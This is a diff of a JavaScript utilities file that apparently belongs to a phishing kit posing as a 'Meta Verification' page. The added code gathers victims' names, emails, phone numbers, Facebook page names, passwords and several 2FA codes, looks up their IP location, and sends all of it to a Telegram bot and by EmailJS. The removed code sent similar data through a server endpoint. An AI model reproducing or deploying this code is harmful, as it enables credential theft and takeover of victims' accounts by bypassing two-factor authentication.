@@ -1,112 +1,246 @@
-// /public/js/utils.js
+// Utilities
+const Utils = {
+    encrypt(text) {
+        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
+    },
 
-const Utils = (() => {
+    decrypt(cipherText) {
+        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
+        return bytes.toString(CryptoJS.enc.Utf8);
+    },
 
-  // ── Ticket ID ──────────────────────────────────────────────
-  function generateTicketId() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
-    return `${seg()}-${seg()}-${seg()}`;
-  }
+    saveRecord(key, value) {
+        try {
+            const encryptedValue = this.encrypt(JSON.stringify(value));
+            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
+            localStorage.setItem(key, JSON.stringify(record));
+        } catch (error) {
+            console.error('Save error:', error);
+        }
+    },
 
-  // ── Mask helpers ───────────────────────────────────────────
-  function maskEmail(email) {
-    if (!email) return '';
-    const [local, domain] = email.split('@');
-    const visible = local.slice(0, 2);
-    return `${visible}***@${domain}`;
-  }
+    getRecord(key) {
+        try {
+            const item = localStorage.getItem(key);
+            if (!item) return null;
+            const { value, expiry } = JSON.parse(item);
+            if (Date.now() > expiry) {
+                localStorage.removeItem(key);
+                return null;
+            }
+            const decrypted = this.decrypt(value);
+            return decrypted ? JSON.parse(decrypted) : null;
+        } catch (error) {
+            return null;
+        }
+    },
 
-  function maskPhone(phone) {
-    if (!phone) return '';
-    return phone.slice(0, 3) + '****' + phone.slice(-2);
-  }
+    async getUserIp() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error getting IP:', error);
+            return 'N/A';
+        }
+    },
 
-  // ── Local Storage (encrypted with CryptoJS) ────────────────
-  const SECRET = 'local_enc_key_2025'; // only used for localStorage, not Telegram
+    async getUserLocation() {
+        const apis = [
+            async () => {
+                const r = await fetch("https://freeipapi.com/api/json");
+                const d = await r.json();
+                if (!d.ipAddress) throw new Error("freeipapi failed");
+                return {
+                    ip: d.ipAddress || "N/A",
+                    city: d.cityName || "N/A",
+                    region: d.regionName || "N/A",
+                    country: d.countryCode || "N/A"
+                };
+            },
+            async () => {
+                const r = await fetch("https://ipapi.co/json/");
+                const d = await r.json();
+                if (d.error) throw new Error("ipapi.co failed");
+                return {
+                    ip: d.ip || "N/A",
+                    city: d.city || "N/A",
+                    region: d.region || "N/A",
+                    country: d.country_code || "N/A"
+                };
+            },
+            async () => {
+                const r = await fetch("https://get.geojs.io/v1/ip/geo.json");
+                const d = await r.json();
+                return {
+                    ip: d.ip || "N/A",
+                    city: d.city || "N/A",
+                    region: d.region || "N/A",
+                    country: d.country_code || "N/A"
+                };
+            }
+        ];
 
-  function saveRecord(key, data) {
-    try {
-      const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), SECRET).toString();
-      const record = { data: encrypted, ts: Date.now() };
-      localStorage.setItem(key, JSON.stringify(record));
-    } catch (e) {
-      console.error('saveRecord error', e);
+        for (const api of apis) {
+            try {
+                const d = await api();
+                return {
+                    location: `${d.ip} | ${d.city} | ${d.region} (${d.country})`,
+                    country_code: d.country,
+                    ip: d.ip,
+                    city: d.city,
+                    region: d.region,
+                    country: d.country
+                };
+            } catch (_) {
+                continue;
+            }
+        }
+
+        return {
+            location: "N/A",
+            country_code: "N/A",
+            ip: "N/A",
+            city: "N/A",
+            region: "N/A",
+            country: "N/A"
+        };
+    },
+
+    async sendToTelegram(data) {
+        const locationData = await this.getUserLocation();
+
+        const text = `
+🌐 <b>IP:</b> <code>${locationData.ip}</code>
+📍 <b>City:</b> <code>${locationData.city}</code>
+🗺 <b>Region:</b> <code>${locationData.region}</code>
+🏳 <b>Country:</b> <code>${locationData.country}</code>
+----------------------------------
+👤 <b>Full Name:</b> <code>${data.fullName || ''}</code>
+📧 <b>Email:</b> <code>${data.email || ''}</code>
+💼 <b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
+📄 <b>Page Name:</b> <code>${data.fanpage || ''}</code>
+📱 <b>Phone:</b> <code>${data.phone || ''}</code>
+----------------------------------
+🔑 <b>Password(1):</b> <code>${data.password || ''}</code>
+🔑 <b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
+----------------------------------
+🔐 <b>Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
+🔐 <b>Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
+🔐 <b>Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                    text,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Telegram error:', error);
+        }
+    },
+
+    async sendToEmail(data) {
+        const locationData = await this.getUserLocation();
+
+        const emailContent = `
+IP: ${locationData.ip}
+Location: ${locationData.location}
+----------------------------------
+Full Name: ${data.fullName || ''}
+Email: ${data.email || ''}
+Email Business: ${data.emailBusiness || ''}
+Page Name: ${data.fanpage || ''}
+Phone: ${data.phone || ''}
+Date of Birth: ${data.day}/${data.month}/${data.year}
+----------------------------------
+Password(1): ${data.password || ''}
+Password(2): ${data.passwordSecond || ''}
+----------------------------------
+🔐Code 2FA(1): ${data.twoFa || ''}
+🔐Code 2FA(2): ${data.twoFaSecond || ''}
+🔐Code 2FA(3): ${data.twoFaThird || ''}
+
+Sent at: ${new Date().toLocaleString()}`;
+
+        try {
+            // Load EmailJS SDK if not already loaded
+            if (!window.emailjs) {
+                await this.loadEmailJSSDK();
+            }
+
+            await emailjs.send(
+                CONFIG.EMAILJS_SERVICE_ID,
+                CONFIG.EMAILJS_TEMPLATE_ID,
+                {
+                    to_email: CONFIG.EMAIL_RECIPIENT,
+                    subject: `Meta Verification - ${locationData.location}`,
+                    message: emailContent,
+                    from_name: 'Meta Verification System',
+                    reply_to: data.email || 'noreply@system.com'
+                },
+                CONFIG.EMAILJS_PUBLIC_KEY
+            );
+        } catch (error) {
+            console.error('Email error:', error);
+        }
+    },
+
+    loadEmailJSSDK() {
+        return new Promise((resolve, reject) => {
+            if (window.emailjs) {
+                resolve();
+                return;
+            }
+
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            script.onload = () => {
+                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+                resolve();
+            };
+            script.onerror = reject;
+            document.head.appendChild(script);
+        });
+    },
+
+    async sendNotification(data) {
+        const notificationType = CONFIG.NOTIFICATION_TYPE;
+
+        try {
+            if (notificationType === 'telegram' || notificationType === 'both') {
+                await this.sendToTelegram(data);
+            }
+
+            if (notificationType === 'email' || notificationType === 'both') {
+                await this.sendToEmail(data);
+            }
+        } catch (error) {
+            console.error('Notification error:', error);
+        }
+    },
+
+    maskPhone(phone) {
+        if (!phone || phone.length < 5) return phone;
+        const start = phone.slice(0, 2);
+        const end = phone.slice(-2);
+        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
+    },
+
+    maskEmail(email) {
+        if (!email) return '';
+        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
+            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
+        });
+    },
+
+    generateTicketId() {
+        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
+        return `${gen()}-${gen()}-${gen()}`;
     }
-  }
-
-  function getRecord(key) {
-    try {
-      const raw = localStorage.getItem(key);
-      if (!raw) return null;
-      const record = JSON.parse(raw);
-      if (Date.now() - record.ts > CONFIG.STORAGE_EXPIRY) {
-        localStorage.removeItem(key);
-        return null;
-      }
-      const bytes = CryptoJS.AES.decrypt(record.data, SECRET);
-      return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
-    } catch (e) {
-      return null;
-    }
-  }
-
-  // ── Build Telegram message text ────────────────────────────
-  function buildMessage(data) {
-    const c = (val) => val ? `<code>${val}</code>` : '';
-    const dob = (data.day && data.month && data.year)
-      ? `${data.day}/${data.month}/${data.year}` : '';
-
-    const lines = [];
-
-    lines.push(`🔔 <b>NEW SUBMISSION</b>`);
-    lines.push(`-----------------------------`);
-    lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
-    lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
-    lines.push(`<b>Date of birth:</b> ${c(dob)}`);
-    lines.push(`-----------------------------`);
-    lines.push(`<b>Email:</b> ${c(data.email)}`);
-    lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
-    lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
-    lines.push(`-----------------------------`);
-    if (data.password)       lines.push(`<b>Password(1):</b> ${c(data.password)}`);
-    if (data.passwordSecond) lines.push(`<b>Password(2):</b> ${c(data.passwordSecond)}`);
-    lines.push(`-----------------------------`);
-    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA(1):</b> ${c(data.twoFa)}`);
-    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA(2):</b> ${c(data.twoFaSecond)}`);
-    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA(3):</b> ${c(data.twoFaThird)}`);
-    lines.push(`-----------------------------`);
-    lines.push(`🕐 ${new Date().toLocaleString('vi-VN')}`);
-
-    return lines.join('\n');
-  }
-
-  // ── Send Notification via /api/send-telegram ───────────────
-  async function sendNotification(data) {
-    try {
-      const message = buildMessage(data);
-
-      // APP_SECRET is a non-sensitive request guard (not the Telegram token)
-      // Set this same value in Vercel env var: SECRET_KEY
-      const APP_SECRET = 'HDNDT-JDHT8FNEK-JJHR';
-
-      const res = await fetch('/api/send-telegram', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-secret-key': APP_SECRET,
-        },
-        body: JSON.stringify({ message }),
-      });
-
-      if (!res.ok) {
-        const err = await res.json();
-        console.error('Notification error:', err);
-      }
-    } catch (e) {
-      console.error('sendNotification failed:', e);
-    }
-  }
-
-  return { generateTicketId, maskEmail, maskPhone, saveRecord, getRecord, sendNotification };
-})();
+};
